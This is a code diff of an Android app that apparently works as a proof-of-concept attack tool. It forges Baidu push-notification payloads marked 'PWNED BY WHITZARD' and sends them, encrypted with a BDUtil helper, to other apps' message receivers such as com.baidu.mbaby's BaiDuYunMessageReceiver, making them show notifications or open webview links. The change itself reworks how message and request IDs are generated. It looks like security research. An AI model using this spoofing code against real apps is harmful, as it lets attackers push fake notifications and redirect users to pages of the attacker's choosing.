@@ -33,8 +33,7 @@ public class MainActivity extends AppCompatActivity {
         button_mbaby.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View view) {
-                String request_id = random.nextInt(10000)+ ""+random.nextInt(1000000000);
-                sendBaiduMbaby(request_id, bodyBaiduMbaby(request_id), "com.baidu.mbaby", "9249661", "com.baidu.box.receiver.BaiDuYunMessageReceiver");
+                sendBaiduMbaby(bodyBaiduMbaby(), "com.baidu.mbaby", "9249661", "com.baidu.box.receiver.BaiDuYunMessageReceiver");
             }
         });
         button_tingting.setOnClickListener(new View.OnClickListener() {
@@ -57,9 +56,11 @@ public class MainActivity extends AppCompatActivity {
         return "{\"aps\":{\"alert\":\"PWNED\",\"sound\":\"default\",\"badge\":1},\"ext\":{\"t\":\"webview\",\"l\":\"http://www.fudan.edu.cn\",\"exp\":-1,\"mi\":\"broadcast1688_20180504\",\"mid\":\"7adb1961a04d86ae89cefa23b57c29c5\",\"d\":{\"s\":\"PWNED BY WHITZARD\"},\"category\":\"promsg\"}}";
     }
 
-    private String bodyBaiduMbaby(String request_id) {
+    private String bodyBaiduMbaby() {
+//        String msg_id = random.nextInt(10000)+ ""+random.nextInt(1000000000);
+        String msg_id = "153231"+random.nextInt(10000000);
 //        return "{\"title\":\"title\",\"description\":\"description\",\"notification_basic_style\":{\"type\":2,\"pos\":1,\"time\":1526598777,\"body\":{\"msg_id\":"+ random.nextInt(10000000)+",\"group_id\":8,\"msg_type\":0,\"data\":{\"title\":\"PWNED\",\"description\":\"PWNED BY WHITZARD\",\"expire\":\"432000000\",\"url\":\"http:\\/\\/www.fudan.edu.cn\",\"icon\":\"http:\\/\\/www.fudan.edu.cn\\/2016\\/images\\/weibo.jpg\",\"level\":\"1\",\"cate_id\":8,\"banner_tpl_id\":\"1\",\"banner_img\":\"http:\\/\\/www.fudan.edu.cn\\/2016\\/images\\/smalllogo.png\",\"o2o\":1,\"opentype\":2,\"pdt\":\"n2835981\",\"fg\":4835840},\"classid\":3}},\"is_notice\":1}";
-        return "{\"type\" : 1, \"msg_id\" : " + request_id + ", \"title\":\"CSS\", \"content\":\"ZGY\", \"data\":{\"unread\": 0, \"msgNo\": 8, \"url\" : \"http:\\/\\/www.fudan.edu.cn\\/2016\", \"img\": \"http:\\/\\/www.fudan.edu.cn\\/2016\\/images\\/weibo.jpg\"}}";
+        return "{\"type\" : 1, \"msg_id\" : " + msg_id + ", \"title\":\"CSS\", \"content\":\"ZGY\", \"data\":{\"unread\": 0, \"msgNo\": 8, \"url\" : \"http:\\/\\/www.fudan.edu.cn\\/2016\", \"img\": \"http:\\/\\/www.fudan.edu.cn\\/2016\\/images\\/weibo.jpg\"}}";
     }
     private String bodyBaiduHaokan() {
 //        return "{\"title\":\"title\",\"description\":\"description\",\"notification_basic_style\":{\"type\":2,\"pos\":1,\"time\":1526598777,\"body\":{\"msg_id\":"+ random.nextInt(10000000)+",\"group_id\":8,\"msg_type\":0,\"data\":{\"title\":\"PWNED\",\"description\":\"PWNED BY WHITZARD\",\"expire\":\"432000000\",\"url\":\"http:\\/\\/www.fudan.edu.cn\",\"icon\":\"http:\\/\\/www.fudan.edu.cn\\/2016\\/images\\/weibo.jpg\",\"level\":\"1\",\"cate_id\":8,\"banner_tpl_id\":\"1\",\"banner_img\":\"http:\\/\\/www.fudan.edu.cn\\/2016\\/images\\/smalllogo.png\",\"o2o\":1,\"opentype\":2,\"pdt\":\"n2835981\",\"fg\":4835840},\"classid\":3}},\"is_notice\":1}";
@@ -142,8 +143,9 @@ public class MainActivity extends AppCompatActivity {
         Log.d("SendBaiduPush", "sendBaiduPush: successfully "+ receiver);
     }
 
-    private void sendBaiduMbaby(String request_id, String body, String packageName, String app_id, String receiver){
+    private void sendBaiduMbaby(String body, String packageName, String app_id, String receiver){
         String msg_id = random.nextInt(10000)+ ""+random.nextInt(1000000000) + "" + random.nextInt(1000000);
+        String request_id = "153231"+random.nextInt(10000000);
         String encString = BDUtil.a(BDUtil.merge(BDUtil.merge(app_id.getBytes(), msg_id.getBytes()), body.getBytes() ), false);
         byte[] bytes = new byte[0];
         try {
